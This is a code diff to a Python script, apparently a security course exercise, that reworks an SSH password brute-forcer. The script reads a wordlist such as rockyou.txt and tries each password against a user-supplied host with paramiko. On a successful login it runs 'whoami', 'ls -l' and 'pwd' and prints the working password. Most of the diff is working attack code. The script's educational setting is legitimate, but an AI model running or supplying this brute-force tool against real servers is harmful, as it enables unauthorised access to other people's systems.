@@ -17,8 +17,9 @@
     #Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
 
 # Import librabries
-import time
+import time 
 import getpass
+import paramiko
 
 # Define variables
 
@@ -48,7 +49,7 @@ def iterator():
 
 def finder():
     pswrd = getpass.getpass("Please enter your password: ")
-    list = "/home/divermedic/401d8-code/401d8-code/rockyou.txt"
+    list = input("Please enter the full path of the file: ")
     file = open(list, 'r')
     line = file.readline()
     wordlist = []
@@ -67,29 +68,42 @@ def finder():
 # Mode 3: Authenticate to an SSH server by its IP address.
     # Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
 
-def ssh_authorization():
-    IP = input("Enter the IP address of the SSH server: ")
-    username = input("Enter the username: ")
-    wordlist = input("Enter the full path of the list: ")
+def ssh_authentication():
+    host = input("Please provide IP address to SSH into: ")
+    user = input("Please provide a username: ")
+    filepath = input("Enter the filepath for the password list: ")
     port = 22
-
     ssh = paramiko.SSHClient()
+
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-    with open(wordlist, 'r') as file:
-        line = file.readline()
-        while line:
-            password = line.rstrip()
-            try:
-                ssh.connect(IP, username=username, password=password)
-                print(f"Successfully authenticated with password: {password}")
-                return
-            except paramiko.AuthenticationException:
-                pass
-            line = file.readline()
+    try:
+        with open(filepath, 'r') as file:
+            passwords = [line.rstrip() for line in file]
 
-    print("Failed to authenticate with any password in the list.")
+            for password in passwords:
+                try:
+                    ssh.connect(host, port, user, password)
+                    stdin, stdout, stderr = ssh.exec_command("whoami")
+                    time.sleep(3)
+                    output = stdout.read()
+                    print(output)
+                    stdin, stdout, stderr = ssh.exec_command("ls -l")
+                    time.sleep(3)
+                    output = stdout.read()
+                    print(output)
+                    stdin, stdout, stderr = ssh.exec_command("pwd")
+                    time.sleep(3)
+                    output = stdout.read()
+                    print(output)
+                    print("Successful login using password:", password)
+                    break  # Exit loop if successful login
+                except paramiko.AuthenticationException:
+                    print("Authentication failed using password:", password)
 
+    except FileNotFoundError:
+        print("File not found. Please check the filepath.")
+    
 def main():
     mode = input("""Choose mode: 
     1 for Offensive, 
@@ -101,7 +115,7 @@ def main():
     elif mode == "2":
         finder()
     elif mode == "3":
-        ssh_authorization()
+        ssh_authentication()
     elif mode == "4":
         exit
     else:
